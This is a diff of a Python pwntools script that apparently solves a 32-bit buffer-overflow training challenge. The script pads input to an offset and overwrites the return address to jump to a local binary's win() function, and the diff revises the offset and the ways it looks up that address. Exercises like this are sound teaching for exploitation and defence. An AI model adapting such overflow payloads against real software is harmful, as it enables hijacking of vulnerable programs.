@@ -1,34 +1,22 @@
-#!/usr/bin/env python3
-"""
-Solution for Hands-on Challenge - x86 (32-bit)
-"""
 from pwn import *
 
-# Set context
-context.arch = 'i386'
-context.log_level = 'info'
+elf = ELF('./challenge')
+context.binary = elf
 
-# Load binary
-elf = ELF('../handson/x86/challenge')
+offset = 76
+win_address = 0x080491a6
+# or
+win_address = elf.symbols['win']
+# or
+win_address = elf.sym['win']
+# or
+win_address = elf.functions['win'].address
 
-# Start process
-p = process('../handson/x86/challenge')
-
-# Find offset (buffer[64] + saved EBP = 64 + 4 = 68 bytes for 32-bit)
-offset = 64 + 4  # 68 bytes
-
-# Get win function address
-win_addr = elf.symbols['win']
-log.info(f"win() address: {hex(win_addr)}")
-
-# Build payload
 payload = b'A' * offset
-payload += p32(win_addr)
+payload += pack(win_address)
 
-log.info(f"Payload length: {len(payload)}")
+p = process('./challenge')
 
-# Send payload
 p.sendlineafter(b'input: ', payload)
 
-# Get output
 p.interactive()
